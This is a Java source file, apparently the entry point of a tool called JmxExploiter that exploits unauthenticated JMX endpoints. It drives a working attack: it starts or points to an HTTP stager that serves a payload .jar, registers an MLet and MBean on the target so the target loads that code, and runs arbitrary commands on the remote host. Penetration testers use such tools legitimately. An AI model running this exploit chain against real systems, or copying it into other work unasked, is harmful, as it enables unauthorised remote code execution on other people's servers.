package de.qtc.jmxexploiter;

import de.qtc.jmxexploiter.GreenGrocer;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Properties;
import java.util.Scanner;

import javax.management.MalformedObjectNameException;

import org.apache.commons.cli.*;

public class JmxExploiter {

    private static String defaultConfiguration = "/config.properties";

    public static void main(String[] argv) {

        Options options = new Options();
        
        Option stagerHost = new Option("sh", "stagerHost", true, "IP address of the .jar providing host");
        stagerHost.setRequired(false);
        options.addOption(stagerHost);

        Option stagerPort = new Option("sp", "stagerPort", true, "HTTP port of the .jar providing host");
        stagerPort.setRequired(false);
        options.addOption(stagerPort);

        Option stagerOnly = new Option("so", "stagerOnly", false, "Only start a HTTP payload server");
        stagerOnly.setRequired(false);
        options.addOption(stagerOnly);

        Option remoteStager = new Option("rs", "remoteStager", false, "do not create a local HTTP listener");
        remoteStager.setRequired(false);
        options.addOption(remoteStager);

        Option configOption = new Option("c", "config", true, "path to a configuration file");
        configOption.setRequired(false);
        options.addOption(configOption);

        Option command = new Option("e", "exec", true, "command to execute on the remote host");
        command.setRequired(false);
        options.addOption(command);

        Option boundName = new Option("b", "boundName", true, "bound name of the jmx-rmi endpoint");
        boundName.setRequired(false);
        options.addOption(boundName);

        Option username = new Option("u", "username", true, "username if JMX requires authentication");
        username.setRequired(false);
        options.addOption(username);

        Option password = new Option("p", "password", true, "password if JMX requires authentication");
        password.setRequired(false);
        options.addOption(password);

        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine commandLine = null;

        String helpString = "JmxExploiter [options] <ip> <port> <action>\n"
                           +"Helps you to exploit unauthenticated JMX endpoints\n\n"
                           +"Positional Arguments:\n"
                           +" ip:                      IP address of your target\n"
                           +" port:                    Port where JMX agent is listening\n"
                           +" action:                  One of the possible actions listed below\n\n"
                           +"Possible Actions:\n"
                           +" status                   Check if MLet or MBean are already deployed\n"
                           +" deployAll                Deploy MLet and MBean\n"
                           +" deployMLet               Only deploy MLet\n"
                           +" deployMBean              Only deploy MBean\n"
                           +" undeployAll              Undeploy MLet and MBean\n"
                           +" undeployMLet             Only undeploy MLet\n"
                           +" undeployMBean            Only undeploy MBean\n"
                           +" execute                  Execute specified command (-e)\n"
                           +" executeBackground        Execute command (-e) in the background\n"
                           +" ping                     Check if MBean is working\n\n"  
                           +"Optional Arguments:";

        try {
            commandLine = parser.parse(options, argv);
        } catch (ParseException e) {
            formatter.printHelp(helpString, options);
            System.exit(1);
        }

        /* The default configuration values are loaded from the default configuration file inside the .jar */
        Properties config = new Properties();
        JmxExploiter.loadConfig(defaultConfiguration, config, false);

        /* If an additional configuration file is specified on the command line, we overwrite specified properties */
        String additionalConfig = commandLine.getOptionValue("config", null);
        if( additionalConfig != null )
            JmxExploiter.loadConfig(additionalConfig, config, true);


        boolean stagerOnlyValue = commandLine.hasOption("stagerOnly");
        boolean remoteStagerValue = commandLine.hasOption("remoteStager");
        String cmd = commandLine.getOptionValue("exec", config.getProperty("defaultCmd"));
        String userNameValue = commandLine.getOptionValue("username", config.getProperty("username"));
        String passwordValue = commandLine.getOptionValue("password", config.getProperty("password"));
        String boundNameValue = commandLine.getOptionValue("boundName", config.getProperty("boundName"));
        String stagerPortValue = commandLine.getOptionValue("stagerPort", config.getProperty("stagerPort"));
        String stagerHostValue = commandLine.getOptionValue("stagerHost", config.getProperty("stagerHost"));

        String jarPath = config.getProperty("jarPath");
        String jarName = config.getProperty("jarName");
        String beanClass = config.getProperty("beanClass");
        String objectName = config.getProperty("objectName");
        String mLetNameString = config.getProperty("mLetName");

        GreenGrocer gg = null;
        try {
            gg = new GreenGrocer(jarPath, jarName, beanClass, objectName, mLetNameString);
        } catch( MalformedObjectNameException e ) {
            System.out.println("[-] Object name '" + objectName + "' seems to be invalid");
            System.exit(1);
        }

        if( stagerOnlyValue ) {
            gg.startStagerServer(stagerHostValue, stagerPortValue);
            Scanner dummyScanner = new Scanner(System.in);
            System.out.println("Press Enter to stop listening...");
            dummyScanner.nextLine();
            System.exit(0); 
        }

        /* At this point <IP> <PORT> and <ACTION> should be present on the command line */
        List<String> remainingArgs = commandLine.getArgList();
        if( remainingArgs.size() != 3 ) {
            formatter.printHelp(helpString, options);
            System.exit(1);
        }

        String remoteHost = remainingArgs.get(0);
        String remotePort = remainingArgs.get(1);
        String action = remainingArgs.get(2);

        int remotePortNumeric = 8000;
        try {
            remotePortNumeric = Integer.valueOf(remotePort);
        } catch( Exception e ) {
            System.out.println("[-] Error - Remote port has to be a numeric value!");
        }

        gg.connect(remoteHost, remotePortNumeric, userNameValue, passwordValue, boundNameValue);

        switch( action ) {
            case "status":
                gg.jmxStatus();
                break;
            case "deployAll":
                gg.registerMLet();
                gg.registerBean(stagerHostValue, stagerPortValue, remoteStagerValue);
                break;
            case "deployMLet":
                gg.registerMLet();
                break;
            case "deployMBean":
                gg.registerBean(stagerHostValue, stagerPortValue, remoteStagerValue);
                break;
            case "undeployAll":
                gg.unregisterBean();
                gg.unregisterMLet();
                break;
            case "undeployMBean":
                gg.unregisterBean();
                break;
            case "undeployMLet":
                gg.unregisterMLet();
                break;
            case "ping":
                gg.ping();
                break;
            case "execute":
                gg.executeCommand(cmd, true);
                break;
            case "executeBackground":
                gg.executeCommandBackground(cmd, true);
                break;
            default: 
                System.err.println("[-] Unkown action: '" + action + "'.");
                System.err.println("[-] Doing nothing.");
                break;
        }
    }

    private static void loadConfig(String filename, Properties prop, boolean extern) {

        InputStream configStream = null;
        try {
            if( extern ) {
                configStream = new FileInputStream(filename);
            } else {
                configStream = JmxExploiter.class.getResourceAsStream(filename);
            }

        prop.load(configStream);
        configStream.close();

        } catch( IOException e ) {
            System.out.println("[-] Unable to load properties file '" + filename + "'");
            System.exit(1);
        }

    }
}
